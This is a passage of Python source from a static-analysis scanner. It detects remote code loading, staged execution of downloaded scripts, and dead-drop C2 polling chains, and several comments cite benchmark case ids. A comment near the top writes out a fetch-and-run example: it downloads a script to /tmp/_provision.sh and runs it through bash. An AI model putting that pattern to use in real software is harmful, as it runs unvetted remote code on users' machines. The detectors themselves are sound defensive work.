    """Names of locally-defined functions whose RETURN value is network-derived."""
    names: set[str] = set()
    for fn in ast.walk(tree):
        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        local: set[str] = set()
        for _ in range(4):  # small fixpoint — helper bodies are short
            changed = False
            for a in ast.walk(fn):
                if not isinstance(a, ast.Assign):
                    continue
                if not (_expr_reads_remote(a.value) or (_names_in(a.value) & local)):
                    continue
                for t in a.targets:
                    if isinstance(t, ast.Name) and t.id not in local:
                        local.add(t.id)
                        changed = True
            if not changed:
                break
        for r in ast.walk(fn):
            if isinstance(r, ast.Return) and r.value is not None:
                if _expr_reads_remote(r.value) or (_names_in(r.value) & local):
                    names.add(fn.name)
                    break
    return names


def _remote_code_load_findings(tree: ast.AST) -> list[tuple[int, str]]:
    """B-284: (lineno, reason) for every exec/eval sink fed by network-read bytes that
    arrived through a local helper's return value (the one hop TT5 misses)."""
    remote_funcs = _remote_returning_funcs(tree)
    if not remote_funcs:
        return []
    tainted: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(6):
        changed = False
        for a in assigns:
            hop = any(
                isinstance(sub, ast.Call)
                and isinstance(sub.func, ast.Name)
                and sub.func.id in remote_funcs
                for sub in ast.walk(a.value)
            )
            if not (hop or (_names_in(a.value) & tainted)):
                continue
            for t in a.targets:
                if isinstance(t, ast.Name) and t.id not in tainted:
                    tainted.add(t.id)
                    changed = True
        if not changed:
            break
    if not tainted:
        return []
    found: list[tuple[int, str]] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        f = node.func
        if not (isinstance(f, ast.Name) and f.id in _REMOTE_CODE_EXEC_SINKS):
            continue
        any_t, _direct = _call_args_tainted(node, tainted)
        if any_t:
            found.append(
                (
                    getattr(node, "lineno", 0),
                    f"content fetched from a remote URL is passed to {f.id}() via a local "
                    "helper's return value — remote code loader (the payload lives at the "
                    "URL, not in the shipped file)",
                )
            )
    return found


# B-284: the Python twin of SHELL_STAGED_EXEC. Remote bytes are written to a literal
# path, and that same literal path is then executed:
#
#     r = requests.get(UPSTREAM, timeout=5)
#     with open("/tmp/_provision.sh", "w") as fh:
#         fh.write(r.text)
#     subprocess.run("bash /tmp/_provision.sh", shell=True)
#
# No name-level taint survives the file write (the subprocess argument is a plain string
# literal), so TT5_CMD_INJECTION cannot see it and the file yields only
# `DANGEROUS_SINK info` — case_00975's real shape. As with the shell rule, the precision
# comes from requiring TWO signals to name the SAME literal path: a write fed by a remote
# fetch, and an exec sink mentioning that path.
_STAGED_WRITE_METHODS = {"write", "writelines", "write_text", "write_bytes"}


def _literal_str(node: ast.AST) -> str:
    """The value of a string literal node, or "" for anything non-constant."""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    return ""


def _open_path_bindings(tree: ast.AST, remote: set[str]) -> dict[str, str]:
    """Map a file-handle name -> the literal path it was opened for WRITING at.

    Covers both `with open(P, "w") as fh:` and `fh = open(P, "w")`.
    """
    out: dict[str, str] = {}

    def _path_if_write_open(call: ast.AST) -> str:
        if not isinstance(call, ast.Call):
            return ""
        f = call.func
        name = f.id if isinstance(f, ast.Name) else (f.attr if isinstance(f, ast.Attribute) else "")
        if name != "open":
            return ""
        path = _literal_str(call.args[0]) if call.args else ""
        mode = _literal_str(call.args[1]) if len(call.args) > 1 else ""
        for kw in call.keywords:
            if kw.arg == "mode":
                mode = _literal_str(kw.value)
        if not path or "w" not in mode and "a" not in mode:
            return ""
        return path

    for node in ast.walk(tree):
        if isinstance(node, ast.With):
            for item in node.items:
                p = _path_if_write_open(item.context_expr)
                if p and isinstance(item.optional_vars, ast.Name):
                    out[item.optional_vars.id] = p
        elif isinstance(node, ast.Assign):
            p = _path_if_write_open(node.value)
            if p:
                for t in node.targets:
                    if isinstance(t, ast.Name):
                        out[t.id] = p
    return out


def _staged_remote_paths(tree: ast.AST, remote: set[str]) -> set[str]:
    """Literal paths that receive remote-fetched bytes."""
    handles = _open_path_bindings(tree, remote)
    paths: set[str] = set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call) or not isinstance(node.func, ast.Attribute):
            continue
        if node.func.attr not in _STAGED_WRITE_METHODS:
            continue
        # the written value must be remote-derived
        if not any(_names_in(a) & remote or _expr_reads_remote(a) for a in node.args):
            continue
        recv = node.func.value
        if isinstance(recv, ast.Name) and recv.id in handles:
            paths.add(handles[recv.id])
        else:
            # Path("/tmp/x.sh").write_text(remote) — the path is the receiver's own arg.
            if isinstance(recv, ast.Call) and recv.args:
                p = _literal_str(recv.args[0])
                if p:
                    paths.add(p)
    return paths


def _staged_exec_findings(tree: ast.AST, remote: set[str]) -> list[tuple[int, str]]:
    """B-284: (lineno, path) where a staged remote payload path is executed."""
    paths = _staged_remote_paths(tree, remote)
    if not paths:
        return []
    found: list[tuple[int, str]] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        is_exec, _sink = _is_exec_sink_call(node.func)
        if not is_exec:
            continue
        blob = " ".join(
            _literal_str(sub)
            for arg in list(node.args) + [kw.value for kw in node.keywords]
            for sub in ast.walk(arg)
        )
        for p in paths:
            if p and p in blob:
                found.append((getattr(node, "lineno", 0), p))
                break
    return found


def _remote_fetch_tainted_names(tree: ast.AST) -> set[str]:
    """Names holding network-fetched data — direct fetch calls plus the one local-helper
    return hop. Shared by REMOTE_CODE_LOAD and REMOTE_STAGED_EXEC."""
    remote_funcs = _remote_returning_funcs(tree)
    tainted: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(6):
        changed = False
        for a in assigns:
            hop = any(
                isinstance(sub, ast.Call)
                and isinstance(sub.func, ast.Name)
                and sub.func.id in remote_funcs
                for sub in ast.walk(a.value)
            )
            if not (hop or _expr_reads_remote(a.value) or (_names_in(a.value) & tainted)):
                continue
            for t in a.targets:
                if isinstance(t, ast.Name) and t.id not in tainted:
                    tainted.add(t.id)
                    changed = True
        if not changed:
            break
    return tainted


# F-159 (TA488/OWAReaper — Proofpoint/NSA, CVE-2026-42897): the dead-drop C2 resolver
# shape — a periodic poll of a remote content/search API, whose response is decoded,
# and the decoded value reaches an exec sink. Each leg alone is common and benign (a
# periodic version-check poll; a decode call reading an embedded asset; an exec sink in
# a CLI wrapper); all three chained is a resolver. Reuses this module's EXISTING
# decode->exec vocabulary end to end — `_is_decode_primitive_call` (the same
# base64/hex/b85/zlib primitive family OBFUSCATED_EXEC/CHUNKED_FILE_EXEC already use),
# `_is_exec_sink_call` (the same eval/exec/os.system/subprocess sink set TT5 uses), and
# `_expr_reads_remote`/`_names_in` (the same network-source vocabulary REMOTE_CODE_LOAD
# uses) — no new decode/sink taxonomy is introduced here, only the periodicity leg and
# the taint sweep that connects the three.
#
# Deliberately does NOT gate on the polled host (api.github.com, a gist endpoint, a
# search API, ...): per the task's own finding, the host is legitimate BY DESIGN — that
# is the entire point of a dead drop. A host denylist here would be the exact C-303
# cautionary shape (a signal that scores perfectly on a corpus and is unsound on real
# skills, because every legitimate skill that touches the SAME host would also match).
_SLEEP_BASES = {"time", "asyncio", "trio", "eventlet"}


def _is_sleep_call(node: ast.AST) -> bool:
    """`time.sleep(...)` / `asyncio.sleep(...)` / a bare `sleep(...)` (from `time import
    sleep`) — the periodicity primitive a polling loop uses to wait between rounds."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if isinstance(f, ast.Name) and f.id == "sleep":
        return True
    return isinstance(f, ast.Attribute) and f.attr == "sleep" and _attr_base(f.value) in _SLEEP_BASES


def _fetching_funcnames(tree: ast.AST) -> set[str]:
    """Names of locally-defined functions whose OWN body performs a network fetch
    (`_is_remote_fetch_call`) anywhere in it — one hop, mirroring this module's other
    remote-fetch helpers (`_remote_returning_funcs`), used so a poll LOOP that calls a
    small `_poll_once()`-style helper (rather than fetching inline) still counts."""
    names: set[str] = set()
    for fn in ast.walk(tree):
        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        if any(_is_remote_fetch_call(n) for n in ast.walk(fn)):
            names.add(fn.name)
    return names


def _poll_loop_present(tree: ast.AST, fetching_funcs: set[str]) -> bool:
    """True when a `while`/`for` loop's own subtree carries BOTH a sleep-like call and a
    network fetch — inline, or one hop through a name in *fetching_funcs* — the
    `while True: _poll_once(); time.sleep(N)` scheduler shape (leg 1 of the dead-drop
    resolver composition). Deliberately narrow: a cron-like interval config/decorator or
    an "every N minutes" prose directive is NOT recognised here — this narrows rather
    than closes the periodicity signal; widening either needs its own fixture + C-135
    pass, not folding in here unreviewed."""
    for node in ast.walk(tree):
        if not isinstance(node, (ast.While, ast.For)):
            continue
        has_sleep = False
        has_fetch = False
        for sub in ast.walk(node):
            if _is_sleep_call(sub):
                has_sleep = True
                continue
            if isinstance(sub, ast.Call):
                if _is_remote_fetch_call(sub):
                    has_fetch = True
                elif isinstance(sub.func, ast.Name) and sub.func.id in fetching_funcs:
                    has_fetch = True
            if has_sleep and has_fetch:
                return True
    return False


def _deaddrop_fetch_tainted_names(scope: ast.AST) -> set[str]:
    """F-159: names holding network-fetched data WITHIN *scope*'s own body, propagated
    through simple assignment AND a plain `for` target over a fetch-tainted iterable —
    unlike `_remote_fetch_tainted_names` (Assign only), which misses the dead-drop
    shape's `for line in body.splitlines():` idiom.

    *scope* MUST be one node from `_deaddrop_resolver_findings`'s own scope list (an
    `ast.Module`, or a single `ast.FunctionDef`/`ast.AsyncFunctionDef`), walked via
    `_scope_own_nodes` — which stops at nested function/class/lambda boundaries. C-135
    (adversarial self-review, same pass this check's own DoD requires): an EARLIER cut
    walked the WHOLE tree in one flat pass, so a bare name reused across two unrelated
    SIBLING functions (e.g. `data` fetched in a poller, and an unrelated `data` literal
    in a totally different installer function) let the second bleed the first's taint —
    a confirmed false FAIL. Scoping per function (mirroring `_scope_own_nodes`'s own
    stated purpose: "a local name reused across sibling functions is resolved
    per-scope, not conflated") closes that without weakening detection: the bad
    fixture's poll/decode/exec all live in ONE function, so a per-scope sweep still
    sees them together; only the periodicity leg (`_poll_loop_present`,
    `_fetching_funcnames`) is intentionally structural/cross-function, one hop, exactly
    like this module's other B-284 remote-fetch helpers."""
    tainted: set[str] = set()
    assigns = [n for n in _scope_own_nodes(scope) if isinstance(n, ast.Assign)]
    for_loops = [n for n in _scope_own_nodes(scope) if isinstance(n, ast.For)]
    for _ in range(6):
        changed = False
        for a in assigns:
            if not (_expr_reads_remote(a.value) or (_names_in(a.value) & tainted)):
                continue
            for t in a.targets:
                for name in _assign_target_names(t):
                    if name not in tainted:
                        tainted.add(name)
                        changed = True
        for f in for_loops:
            if not (_expr_reads_remote(f.iter) or (_names_in(f.iter) & tainted)):
                continue
            for name in _assign_target_names(f.target):
                if name not in tainted:
                    tainted.add(name)
                    changed = True
        if not changed:
            break
    return tainted


def _deaddrop_decode_tainted_names(scope: ast.AST, fetch_tainted: set[str]) -> set[str]:
    """F-159: names holding the DECODED form of *fetch_tainted* data, WITHIN *scope*'s
    own body (see `_deaddrop_fetch_tainted_names`'s docstring for the scoping
    discipline and why it matters) — an assignment whose RHS is a real decode primitive
    (`_is_decode_primitive_call`, the same base64/hex/b85/zlib family OBFUSCATED_EXEC
    already trusts) applied to a fetch-tainted argument, propagated onward through
    further plain assignment."""
    if not fetch_tainted:
        return set()
    tainted: set[str] = set()
    assigns = [n for n in _scope_own_nodes(scope) if isinstance(n, ast.Assign)]
    for _ in range(6):
        changed = False
        for a in assigns:
            rhs = a.value
            is_decode_of_fetched = (
                _is_decode_primitive_call(rhs)
                and bool(rhs.args)
                and bool(_names_in(rhs.args[0]) & fetch_tainted or _expr_reads_remote(rhs.args[0]))
            )
            if not (is_decode_of_fetched or (_names_in(rhs) & tainted)):
                continue
            for t in a.targets:
                for name in _assign_target_names(t):
                    if name not in tainted:
                        tainted.add(name)
                        changed = True
        if not changed:
            break
    return tainted


def _deaddrop_subprocess_command_parts(
    node: ast.Call, list_bindings: dict[str, ast.List | ast.Tuple] | None
) -> list[ast.AST] | None:
    """F-159 follow-up (adversarial review on B347, subprocess data-argument false
    FAIL): for a subprocess.* exec-sink Call *node*, return the list of the call's own
    argument sub-expressions that constitute COMMAND position — the thing execve (or
    a shell, or a re-invoked interpreter) actually runs — or None when the WHOLE call
    is command position (shell=True/an unprovable dynamic shell= value, or the command
    is not a resolvable fixed argv list — a string/joined/concatenated/unresolved-name
    form, where there is no safe "data argument" position to carve out at all).

    When a list is returned, it is EXACTLY argv[0] (the fixed program element) unless
    argv[0] itself names a shell/indirect-execution interpreter
    (`_argv0_is_shell_indirect_exec`), in which case every element counts, since that
    interpreter re-parses the rest of the argv list as its own command text — the
    identical classification `_subprocess_taint_is_command_injection` already applies
    for TT5/TT5_ARG_INJECTION, reused here (not re-derived) so the two checks can
    never quietly disagree about what "command position" means for the same call
    shape.

    Only subprocess.* has this distinction at all: os.system()/os.popen() run their
    sole string argument through a shell (whatever is IN the string is executed —
    there is no separate inert-data position), and a bare eval or exec call runs its
    sole argument itself AS code. Callers only invoke this for a `sink_name` that starts
    with `"subprocess."`; see `_deaddrop_resolver_findings`.
    """
    for kw in node.keywords:
        if kw.arg == "shell":
            v = kw.value
            if not (isinstance(v, ast.Constant) and v.value is False):
                return None  # shell=True, or an unprovable dynamic value
    first = node.args[0] if node.args else None
    if isinstance(first, ast.Name) and list_bindings:
        first = list_bindings.get(first.id, first)
    if not isinstance(first, (ast.List, ast.Tuple)) or not first.elts:
        return None  # string / joined-str / concatenated / unresolved / empty command
    elts = first.elts
    if _argv0_is_shell_indirect_exec(elts):
        return list(elts)  # the interpreter re-parses ALL of them as command text
    return [elts[0]]


def _deaddrop_resolver_findings(
    tree: ast.AST,
    list_bindings_by_call: dict[ast.Call, dict[str, ast.List | ast.Tuple]] | None = None,
) -> tuple[list[tuple[int, str]], list[tuple[int, str]]]:
    """F-159: the dead-drop C2 resolver composition — see the module comment above
    `_SLEEP_BASES`. Returns (confirmed, ambiguous), each a list of (lineno, reason):

      confirmed — WITHIN ONE SCOPE (a function, or module top-level), the decoded
                  value (or an inline decode of fetch-tainted content) is a
                  demonstrable ARGUMENT of an exec-sink call, AND — for a
                  subprocess.* sink specifically — that argument lands in COMMAND
                  position, not merely a trailing DATA position of a fixed,
                  non-interpreter program (`_deaddrop_subprocess_command_parts`) —
                  FAIL-grade (taint confirmed AND the decoded value is the thing
                  actually executed, not merely inert execve data). Taint is
                  deliberately scoped per function (`_deaddrop_fetch_tainted_names`'s
                  docstring) so an unrelated sibling function's same-named local can
                  never be mistaken for fetched/decoded data.
      ambiguous — a poll loop, a decode primitive, AND an exec sink are all present
                  SOMEWHERE in the file (this leg is intentionally file-wide, not
                  per-scope — it names an ambiguous co-occurrence for human review, not
                  a proven chain), but no scope's dataflow confirms the decoded value
                  is EXECUTED by the sink — either no connection is confirmed at all,
                  or (adversarial-review follow-up) the only confirmed connection is
                  the decoded value reaching a subprocess.* sink as a non-program data
                  argument to a FIXED, trusted local binary — e.g.
                  `subprocess.run(["logger", "-t", "x", corr_id])` logging a decoded
                  correlation id, or `subprocess.run(["sha256sum", "--check",
                  checksum])` verifying a downloaded artifact's integrity with a
                  decoded checksum. Both are common, legitimate patterns (the
                  checksum case is a security-POSITIVE integrity check) — WARN-grade,
                  same "argument injection, not command injection" distinction
                  TT5_ARG_INJECTION already draws for the general case, deliberately
                  reused rather than re-derived (see
                  `_subprocess_taint_is_command_injection`'s docstring).

    Neither list is populated unless the poll-loop gate (`_poll_loop_present`) holds —
    a one-shot fetch->decode->exec with no periodicity is not this rule's concern; the
    direct one-shot case is already covered elsewhere in this module (TT5_CMD_INJECTION,
    REMOTE_CODE_LOAD).

    *list_bindings_by_call* (optional, default None — an empty per-call binding map is
    used when omitted) is `_list_bindings_by_call(tree)`'s result, reused verbatim from
    the caller (never recomputed here) so a subprocess command bound to a local
    variable (`cmd = ["logger", "-t", "x"]; ...; subprocess.run(cmd + [corr_id])` —
    well, more precisely the common `cmd = [...]; subprocess.run(cmd)` single-binding
    idiom `_single_list_bindings_local` resolves) is still recognised as a fixed argv
    list, not treated as an unresolved dynamic command.
    """
    fetching_funcs = _fetching_funcnames(tree)
    if not _poll_loop_present(tree, fetching_funcs):
        return [], []
    if not any(_is_decode_primitive_call(n) for n in ast.walk(tree)):
        return [], []

    bindings_by_call = list_bindings_by_call or {}
    scopes: list[ast.AST] = [tree]
    scopes.extend(n for n in ast.walk(tree) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)))

    confirmed: list[tuple[int, str]] = []
    exec_sink_present = False
    first_sink_lineno = 0
    for scope in scopes:
        fetch_tainted = _deaddrop_fetch_tainted_names(scope)
        decode_tainted = _deaddrop_decode_tainted_names(scope, fetch_tainted)
        for node in _scope_own_nodes(scope):
            if not isinstance(node, ast.Call):
                continue
            is_exec, sink_name = _is_exec_sink_call(node.func)
            if not is_exec:
                continue
            exec_sink_present = True
            ln = getattr(node, "lineno", 0)
            if not first_sink_lineno:
                first_sink_lineno = ln
            args = list(node.args) + [kw.value for kw in node.keywords]
            # F-159 follow-up: for subprocess.* alone, narrow which of the call's own
            # argument sub-expressions count as a genuine "decoded value IS the
            # executed thing" hit down to COMMAND position — see
            # _deaddrop_subprocess_command_parts's docstring. eval/exec/os.system/
            # os.popen have no such position (their whole argument IS the code/shell
            # command), so `hit_args` stays the full argument list for those.
            hit_args = args
            if sink_name.startswith("subprocess."):
                command_parts = _deaddrop_subprocess_command_parts(
                    node, bindings_by_call.get(node)
                )
                if command_parts is not None:
                    hit_args = command_parts
            direct_hit = bool(decode_tainted) and any(_names_in(a) & decode_tainted for a in hit_args)
            inline_hit = any(
                _is_decode_primitive_call(sub)
                and bool(sub.args)
                and bool(_names_in(sub.args[0]) & fetch_tainted or _expr_reads_remote(sub.args[0]))
                for a in hit_args
                for sub in ast.walk(a)
            )
            if direct_hit or inline_hit:
                confirmed.append(
                    (
                        ln,
                        "content polled from a remote source on a timer is decoded and the "
                        f"decoded value reaches {sink_name}() — dead-drop C2 resolver shape "
                        "(poll -> decode -> exec)",
                    )
                )
    if confirmed:
        return confirmed, []
    if exec_sink_present:
        return (
            [],
            [
                (
                    first_sink_lineno,
                    "a periodic network poll, a decode primitive, and an exec sink are "
                    "all present in this file, but no exec sink call is confirmed to "
                    "run the decoded value as its executed command/payload (at most an "
                    "inert data argument to a fixed program) — possible dead-drop C2 "
                    "resolver composition (ambiguous)",
                )
            ],
        )
    return [], []


def _func_param_taint_by_scope(tree: ast.AST, owner_map: dict, parent_scope: dict) -> dict:
    """B-413 layer 1: seed each function's OWN parameter names into its OWN taint
    bucket -- the scope-bucketed replacement for the old `_collect_func_params`, whose
    single flat `set[str]` let a parameter in one function taint an unrelated
    same-named local in a completely different function (SkillTrustBench case_00374:
    `_venv_python(venv_dir)`'s parameter falsely tainted an unrelated `venv_dir` local
    in `main()`, a deterministic `__file__`-derived path), or let a generic name
    (`missing`/`data`/`result`) reused across sibling functions collide (case_01948).

    Returns a dict keyed by owning scope node (mirrors `_tainted_names`'s bucketing:
    a function at any nesting depth, a top-level class's own method, or `None` for
    module-level code). A function that `_build_toplevel_owner_map` never reached --
    it is seeded from `tree.body`'s own top-level funcs/classes only, so a function
    nested inside a bare module-level `if`/`try` (not inside a class or another
    function) is invisible to it -- falls back to the `None` (module) bucket rather
    than being silently dropped: losing the seed entirely would be a false NEGATIVE
    (an untracked parameter would then read as untainted everywhere), so the
    conservative direction here is to over-taint, not under-taint.

    C-135 (round 1, self-review at implementation time): a scope-count safety cap
    that redirected excess scopes to the shared `None` bucket was attempted here and
    RETRACTED before shipping -- an independent adversarial pass proved it a real,
    reproducible detection-loss regression, not the "fails toward crit" safety valve
    its own comment claimed. `_tainted_names_visible`'s shadow-subtraction (correct
    for its ORIGINAL purpose -- a local rebinding shadows an unrelated outer-scope
    taint source of the same name) treats a scope's own parameter binding as shadowing
    the module bucket's same-named entry, so a param whose seed was dumped into `None`
    by the cap became invisible inside its OWN owning function -- the one place it is
    genuinely, unambiguously tainted. Confirmed via an unmodified-default-cap repro (a
    ~6,000-line file, 2001 throwaway functions followed by one real tainted
    `subprocess.call(cmd, shell=True)` wrapper) that TT5_CMD_INJECTION silently never
    fired, where the pre-B-413 flat model correctly caught it. No cap is applied here;
    an unbounded scope count was measured (same adversarial pass) to cost real time
    but not memory (no product/powerset structure, unlike the `_EffectSimulator`
    B-192 blowup this file already guards against elsewhere) -- the project's
    existing `ScanBudgetExceeded`/`check_deadline` wall-clock budget, which already
    wraps the check pipeline, is the correct backstop for that cost, not a
    correctness-affecting cap invented here.
    """
    taint: dict = {}
    for fn in ast.walk(tree):
        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        # A function becomes its OWN scope bucket iff `_build_toplevel_owner_map`
        # actually walked it -- in which case owner_map[fn] is fn itself (see that
        # function's docstring: every FunctionDef/AsyncFunctionDef it reaches maps to
        # itself) and fn is a key of parent_scope. Anything else (unreached by the
        # owner-map walk) is not one of "owner_map's scope set" and falls to None.
        scope = owner_map.get(fn)
        is_own_scope = scope is fn and fn in parent_scope
        bucket = scope if is_own_scope else None

        args = fn.args
        names = {a.arg for a in (*args.posonlyargs, *args.args, *args.kwonlyargs)}
        if args.vararg:
            names.add(args.vararg.arg)
        if args.kwarg:
            names.add(args.kwarg.arg)
        if names:
            taint.setdefault(bucket, set()).update(names)
    return taint


def _is_exec_sink_call(func: ast.AST) -> tuple:
    """Return (is_exec_sink, sink_description) for a call node's func."""
    if isinstance(func, ast.Name) and func.id in _EXEC_SINK_NAMES:
        return True, func.id
    if isinstance(func, ast.Attribute):
        base = _attr_base(func.value)
        if base in _EXEC_SINK_BASES_OS and func.attr in _EXEC_SINK_OS_ATTRS:
            return True, f"os.{func.attr}"
        if base in _EXEC_SINK_BASES_SUBP and func.attr in _EXEC_SINK_SUBP_ATTRS:
            return True, f"subprocess.{func.attr}"
    return False, ""


def _is_net_out_data_sink(func: ast.AST) -> tuple:
    """Return (is_data_net_sink, sink_description) — POST/PUT/PATCH/send* sinks."""
    if isinstance(func, ast.Attribute):
        base = _attr_base(func.value)
        if func.attr in _NET_OUT_SINK_DATA_ATTRS and base in _NET_OUT_SINK_BASES:
            return True, f"{base}.{func.attr}"
        if func.attr in _NET_OUT_SINK_SEND_ATTRS and base in _NET_OUT_SINK_BASES:
            return True, f"{base}.{func.attr}"
    return False, ""


def _is_ssrf_sink_call(func: ast.AST) -> tuple:
    """Return (is_ssrf_sink, sink_description) — GET/urlopen sinks."""
    if isinstance(func, ast.Name) and func.id == "urlopen":
        return True, "urlopen"
    if isinstance(func, ast.Attribute):
        base = _attr_base(func.value)
        if func.attr in _NET_OUT_SINK_FETCH_ATTRS and base in _NET_OUT_SINK_BASES:
            return True, f"{base}.{func.attr}"
    return False, ""


def _call_args_tainted(node: ast.Call, tainted: set[str]) -> tuple:
    """Return (any_tainted, first_arg_direct).

    first_arg_direct: first positional arg is a tainted Name directly.
    """
    all_args = list(node.args) + [kw.value for kw in node.keywords]
    any_tainted = False
    for arg_node in all_args:
        if _names_in(arg_node) & tainted:
            any_tainted = True
            break
        for sub in ast.walk(arg_node):
            if isinstance(sub, ast.JoinedStr) and _names_in(sub) & tainted:
                any_tainted = True
                break
        if any_tainted:
            break
    direct = bool(node.args and isinstance(node.args[0], ast.Name) and node.args[0].id in tainted)
    return any_tainted, direct


def _call_args_tainted_for_exec_sink(
    node: ast.Call, tainted: set[str], ref_res: "_RefResolver | None" = None
) -> tuple:
    """Like `_call_args_tainted`, but ALSO counts an inline external-source call sitting
    directly in the call's own arguments -- with no intermediate variable -- as tainted,
    the same as an already-bound tainted NAME. Scoped to the TT5 exec-sink call site only
    (see its one call site below); TT4, SSRF and the subprocess-argv resolver keep calling
    plain `_call_args_tainted`, unchanged.

    B-916: `_call_args_tainted` intersects only the NAMES appearing in each argument
    against `tainted`, so `exec(urlopen(u).read(), {})` -- external input read and handed
    straight to the sink, nothing ever assigned to a variable -- has no tainted Name in it
    and TT5 silently never fires; OBFUSCATED_EXEC only catches this shape when a
    decode-shaped call rides along too (`.decode()` appended, or the read bound to a name
    first turns it crit -- so the verdict was turning on spelling, not behaviour).
    `_value_is_tainted_source` already recognizes an inline source call
    (`_is_external_source_call`: `input()`/`open()`/any `.read()`-family method/
    `requests.get`/`urlopen`/...), an inline `os.getenv`/`environ.get` read, and an inline
    tool-result-shaped call, walking the WHOLE argument subtree -- exactly the source
    vocabulary TT4/SSRF already trust once a value is ASSIGNED; this only extends that
    same vocabulary to the no-variable case, for the exec-sink rule the ticket names.

    B-906: `ref_res`, optional, adds a positively-resolved inline source too -- e.g.
    `check_call([os.environ["P"], "x"])`, where `os.environ["P"]` is a Subscript with
    no tainted NAME in it at all and `_value_is_tainted_source` does not model a bare
    env-mapping subscript as a source on its own. `ref_res.source_in()` is checked
    only after `_value_is_tainted_source` already said no, so this can only ADD a
    finding relative to `ref_res=None`, never remove one.

    A NAME already in `tainted` is still handled identically to `_call_args_tainted`
    (checked first, unchanged), so this can only ever ADD a finding, never remove one.
    """
    any_tainted, direct = _call_args_tainted(node, tainted)
    if any_tainted:
        return any_tainted, direct
    all_args = list(node.args) + [kw.value for kw in node.keywords]
    for i, arg_node in enumerate(all_args):
        if _value_is_tainted_source(arg_node, tainted) or (
            ref_res is not None and ref_res.source_in(arg_node)
        ):
            # No intermediate variable carries the source to the sink -- that is at
            # least as direct a flow as a bound Name in the first argument.
            return True, i == 0
    return False, False


# The AST nodes that open a NEW binding scope in Python. A name bound inside one of
# these is local to it, not to the enclosing scope, so every per-scope walk in this
# module must stop here. Shared by `_scope_own_nodes` and `_own_bound_names` so the two
# cannot drift apart again (B-214 follow-up: they did, and it cost a crit false FAIL).
_NESTED_SCOPE_NODES = (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef, ast.Lambda)

# B-414: comprehensions (list/set/dict/generator) are ALSO a real Python 3 scope -- a
# `for` target inside one is local to the comprehension, not the enclosing function --
# but they are deliberately kept OUT of `_NESTED_SCOPE_NODES` rather than added to it.
# `_NESTED_SCOPE_NODES` also gates `_scope_own_nodes`, which `_single_list_bindings_local`/
# `_list_bindings_by_call` (B-413 layer 2's argv-list resolution) and
# `_function_composes_decode` (TT4) rely on to see every call/assignment "belonging to"
# a function, INCLUDING ones textually nested inside a comprehension in that function's
# body (`cmd = [...]; [subprocess.run(cmd) for _ in batch]`). Folding comprehensions into
# that boundary too would silently stop `_list_bindings_by_call` from resolving such a
# call's argv list at all (`list_bindings_by_call.get(node)` -> None), which
# `_subprocess_taint_is_command_injection` reads as "unresolved" and defaults to crit --
# trading this ticket's false CRITICAL for a DIFFERENT one on a real, common pattern.
# So comprehension scoping is scoped narrowly to the taint/shadow model that actually
# has the bug (`_own_bound_names`, `_build_toplevel_owner_map`, `_external_tainted_names`
# below), via this separate constant, leaving `_scope_own_nodes` and its consumers
# untouched.
_COMPREHENSION_SCOPE_NODES = (ast.ListComp, ast.SetComp, ast.DictComp, ast.GeneratorExp)


def _enclosing_evaluated_parts(node: ast.AST) -> list:
    """The sub-expressions of a nested scope node that Python evaluates in the
    ENCLOSING scope, not inside the new one: decorators, argument defaults,
    annotations, and class bases/keywords. Only the body is the new scope.

    This matters because a walrus in any of them really does bind in the enclosing
    scope -- `def h(a=(_decode := ...))` inside `run()` binds `_decode` in `run`. A
    name walk that skipped the whole node treated such a rebind as invisible and
    resolved a later `_decode(...)` to an unrelated module-level helper, a crit
    false positive. Pathological in real code, but sound to model and cheap to get
    right, so it is not left as an accepted residual."""
    parts: list = []
    parts.extend(getattr(node, "decorator_list", None) or [])
    args = getattr(node, "args", None)
    if args is not None:
        parts.extend(args.defaults or [])
        parts.extend(d for d in (args.kw_defaults or []) if d is not None)
        for a in (*args.posonlyargs, *args.args, *args.kwonlyargs, args.vararg, args.kwarg):
            if a is not None and a.annotation is not None:
                parts.append(a.annotation)
    if getattr(node, "returns", None) is not None:
        parts.append(node.returns)
    parts.extend(getattr(node, "bases", None) or [])
    parts.extend(kw.value for kw in (getattr(node, "keywords", None) or []))
    return parts


def _scope_own_nodes(scope: ast.AST):
    """Yield nodes belonging to `scope`'s own body, WITHOUT descending into nested
    function/class/lambda scopes (whose local names are unrelated). Used so a local
    name reused across sibling functions is resolved per-scope, not conflated.

    B-214 follow-up: the nested-scope boundary is applied to the SEED body as well as
    to descendants. It used to filter only `iter_child_nodes(n)`, so a nested `def`
    sitting directly in `scope.body` was pushed unfiltered and its whole body leaked
    into the parent's node set -- the boundary held at depth >= 2 but not at depth 1.
    That leak was masked while `_decode_composing_funcnames` shadowed names over the
    entire subtree; once the shadow set was correctly narrowed to a scope's own
    bindings the two walks disagreed, and a nested closure's `return` counted as the
    OUTER function's return path while that closure's rebinding no longer subtracted
    -- a crit false-positive OBFUSCATED_EXEC on a wrapper returning a plain literal.
    Both walks must stop at the same boundary or one re-opens the other's bug."""
    if isinstance(scope, (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef)):
        # Seed with the scope's own statements, minus any nested scope defined
        # directly in it -- same boundary the child filter below applies.
        stack = [b for b in scope.body if not isinstance(b, _NESTED_SCOPE_NODES)]
    else:
        stack = [scope]  # the root IS the scope being analysed; never filter it out
    while stack:
        n = stack.pop()
        yield n
        for child in ast.iter_child_nodes(n):
            if isinstance(child, _NESTED_SCOPE_NODES):
                continue  # nested scope — resolved on its own pass
            stack.append(child)


def _single_list_bindings_local(scope: ast.AST) -> dict[str, ast.List | ast.Tuple]:
    """Names bound EXACTLY ONCE to a list/tuple literal within `scope`'s own body,
    with no later mutation that could change argv[0] (`cmd[0] = ...` / `cmd.insert(...)`).

    Resolves the common real-world safe pattern where the command list is built in a
